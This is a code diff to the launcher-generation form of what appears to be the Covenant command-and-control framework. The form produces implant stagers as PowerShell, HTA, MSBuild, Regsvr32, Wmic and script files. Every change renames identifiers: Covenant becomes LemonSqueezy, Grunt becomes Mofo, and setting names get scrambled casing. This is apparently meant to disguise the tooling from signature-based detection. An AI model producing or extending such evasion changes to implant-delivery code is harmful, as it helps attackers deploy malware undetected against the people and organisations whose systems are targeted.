@@ -1,12 +1,12 @@
-﻿@inherits OwningComponentBase<ICovenantService>
+﻿@inherits OwningComponentBase<ILemonSqueezyService>
 
 @using System.Net.Mime
 @using Microsoft.JSInterop
 @using Microsoft.AspNetCore.Components.Forms
-@using Covenant.Core
-@using Covenant.Models.Grunts
-@using Covenant.Models.Listeners
-@using Covenant.Models.Launchers
+@using LemonSqueezy.Core
+@using LemonSqueezy.Models.Mofos
+@using LemonSqueezy.Models.Listeners
+@using LemonSqueezy.Models.Launchers
 @inject IJSRuntime IJSRuntime
 
 <EditForm Model="Launcher" OnValidSubmit="(e => this.OnGenerate.InvokeAsync(Launcher))">
@@ -81,20 +81,20 @@
     {
         <div class="form-row">
             <div class="form-group col-md-3">
-                <label for="ValidateCert">ValidateCert</label>
-                <select id="ValidateCert" name="ValidateCert" @onchange="(e => UpdateValidateCert(e))" class="form-control">
+                <label for="ValCerT">ValCerT</label>
+                <select id="ValCerT" name="ValCerT" @onchange="(e => UpdateValCerT(e))" class="form-control">
                     <option value="True">True</option>
                     <option value="False">False</option>
                 </select>
-                <div class="text-danger"><ValidationMessage For="() => Launcher.ValidateCert" /></div>
+                <div class="text-danger"><ValidationMessage For="() => Launcher.ValCerT" /></div>
             </div>
             <div class="form-group col-md-3">
-                <label for="UseCertPinning">UseCertPinning</label>
-                <select id="UseCertPinning" name="UseCertPinning" @onchange="(e => UpdateUseCertPinning(e))" class="form-control">
+                <label for="UsCertPin">UsCertPin</label>
+                <select id="UsCertPin" name="UsCertPin" @onchange="(e => UpdateUsCertPin(e))" class="form-control">
                     <option value="True">True</option>
                     <option value="False">False</option>
                 </select>
-                <div class="text-danger"><ValidationMessage For="() => Launcher.UseCertPinning" /></div>
+                <div class="text-danger"><ValidationMessage For="() => Launcher.UsCertPin" /></div>
             </div>
         </div>
     }
@@ -113,14 +113,14 @@
             <div class="text-danger"><ValidationMessage For="() => Launcher.Delay" /></div>
         </div>
         <div class="form-group col-md-3">
-            <label for="JitterPercent">JitterPercent</label>
-            <input id="JitterPercent" name="JitterPercent" @bind="Launcher.JitterPercent" class="form-control" type="number">
-            <div class="text-danger"><ValidationMessage For="() => Launcher.JitterPercent" /></div>
+            <label for="JItterPercent">JItterPercent</label>
+            <input id="JItterPercent" name="JItterPercent" @bind="Launcher.JItterPercent" class="form-control" type="number">
+            <div class="text-danger"><ValidationMessage For="() => Launcher.JItterPercent" /></div>
         </div>
         <div class="form-group col-md-3">
-            <label for="ConnectAttempts">ConnectAttempts</label>
-            <input id="ConnectAttempts" name="ConnectAttempts" @bind="Launcher.ConnectAttempts" class="form-control" type="number">
-            <div class="text-danger"><ValidationMessage For="() => Launcher.ConnectAttempts" /></div>
+            <label for="ConneCTAttEmpts">ConneCTAttEmpts</label>
+            <input id="ConneCTAttEmpts" name="ConneCTAttEmpts" @bind="Launcher.ConneCTAttEmpts" class="form-control" type="number">
+            <div class="text-danger"><ValidationMessage For="() => Launcher.ConneCTAttEmpts" /></div>
         </div>
     </div>
     <div class="form-row">
@@ -272,25 +272,25 @@
         }
     }
 
-    private void UpdateValidateCert(ChangeEventArgs e)
+    private void UpdateValCerT(ChangeEventArgs e)
     {
         if (bool.TryParse(e.Value.ToString(), out bool result))
         {
-            Launcher.ValidateCert = result;
+            Launcher.ValCerT = result;
         }
     }
 
-    private void UpdateUseCertPinning(ChangeEventArgs e)
+    private void UpdateUsCertPin(ChangeEventArgs e)
     {
         if (bool.TryParse(e.Value.ToString(), out bool result))
         {
-            Launcher.UseCertPinning = result;
+            Launcher.UsCertPin = result;
         }
     }
 
     private async Task OnDownload()
     {
-        string filename = (await Service.GetImplantTemplate(this.Launcher.ImplantTemplateId)).Name ?? "GruntStager";
+        string filename = (await Service.GetImplantTemplate(this.Launcher.ImplantTemplateId)).Name ?? "MofoStager";
         string fileext = ".exe";
         string mediatype = "";
         string content = "";
@@ -310,7 +310,7 @@
             case LauncherType.Cscript:
                 fileext = ".js";
                 mediatype = MediaTypeNames.Text.Plain;
-                content = Convert.ToBase64String(Common.CovenantEncoding.GetBytes(((CscriptLauncher)this.Launcher).DiskCode));
+                content = Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(((CscriptLauncher)this.Launcher).DiskCode));
                 break;
             case LauncherType.InstallUtil:
                 fileext = ".dll";
@@ -320,32 +320,32 @@
             case LauncherType.MSBuild:
                 fileext = ".xml";
                 mediatype = MediaTypeNames.Text.Plain;
-                content = Convert.ToBase64String(Common.CovenantEncoding.GetBytes(((MSBuildLauncher)this.Launcher).DiskCode));
+                content = Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(((MSBuildLauncher)this.Launcher).DiskCode));
                 break;
             case LauncherType.Mshta:
                 fileext = ".hta";
                 mediatype = MediaTypeNames.Text.Plain;
-                content = Convert.ToBase64String(Common.CovenantEncoding.GetBytes(((MshtaLauncher)this.Launcher).DiskCode));
+                content = Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(((MshtaLauncher)this.Launcher).DiskCode));
                 break;
             case LauncherType.PowerShell:
                 fileext = ".ps1";
                 mediatype = MediaTypeNames.Text.Plain;
-                content = Convert.ToBase64String(Common.CovenantEncoding.GetBytes(((PowerShellLauncher)this.Launcher).PowerShellCode));
+                content = Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(((PowerShellLauncher)this.Launcher).PowerShellCode));
                 break;
             case LauncherType.Regsvr32:
                 fileext = ".sct";
                 mediatype = MediaTypeNames.Application.Octet;
-                content = Convert.ToBase64String(Common.CovenantEncoding.GetBytes(((Regsvr32Launcher)this.Launcher).DiskCode));
+                content = Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(((Regsvr32Launcher)this.Launcher).DiskCode));
                 break;
             case LauncherType.Wmic:
                 fileext = "xsl";
                 mediatype = MediaTypeNames.Text.Plain;
-                content = Convert.ToBase64String(Common.CovenantEncoding.GetBytes(((WmicLauncher)this.Launcher).DiskCode));
+                content = Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(((WmicLauncher)this.Launcher).DiskCode));
                 break;
             case LauncherType.Wscript:
-                fileext = "GruntStager.js";
+                fileext = "MofoStager.js";
                 mediatype = MediaTypeNames.Text.Plain;
-                content = Convert.ToBase64String(Common.CovenantEncoding.GetBytes(((WscriptLauncher)this.Launcher).DiskCode));
+                content = Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(((WscriptLauncher)this.Launcher).DiskCode));
                 break;
         }
         await IJSRuntime.InvokeAsync<string>("DownloadFile", filename + fileext, mediatype, content);
